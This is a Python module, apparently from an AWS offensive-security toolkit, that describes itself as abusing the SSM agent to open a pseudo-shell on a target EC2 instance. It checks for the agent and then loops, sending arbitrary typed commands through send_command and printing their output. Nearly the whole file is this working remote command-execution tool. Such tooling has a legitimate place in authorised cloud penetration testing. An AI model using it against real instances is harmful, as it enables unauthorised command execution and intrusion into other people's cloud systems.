import time
from colorama import Fore, Style
from functions import ssm_handler, utils

def help():
    print(Fore.YELLOW + "\n================================================================================================" + Style.RESET_ALL)
    print("[+] Module Description:\n")
    print("\tThis module will try to abuse SSM agent to create a pseudo-shell on a target EC2.\n")
    print(Fore.YELLOW + "================================================================================================" + Style.RESET_ALL)

def check_agent(ssm, instance_id):
    instance = ssm.describe_instance_information(instance_id)
    if instance:
        return instance
    else:
        print("[-] No instance matching ID found...")
        return False

def main(botoconfig, session):
    print(Fore.YELLOW + "\n================================================================================================" + Style.RESET_ALL)
    print("[+] Starting SSM Shell...\n")
    instance_id = input("[+] Instance-id: ")
    region_option = input("[+] Region: ")
    print("\n[+] Creating client...")
    ssm = ssm_handler.SSM(botoconfig, session, region_option)

    print("[+] Checking for SSM agent on requested instance...")
    isAgent = check_agent(ssm, instance_id)
    if isAgent:
        print("[+] Instance Found, initiating shell...")
        while True:
            command = input(f"{Fore.GREEN}>>> {Style.RESET_ALL}")
            commandDict = ssm.send_command(instance_id, command)
            commandId = commandDict["Command"]["CommandId"]
            time.sleep(1)
            commandResult = ssm.get_command_invocation(instance_id, commandId)

            print(commandResult["StandardOutputContent"])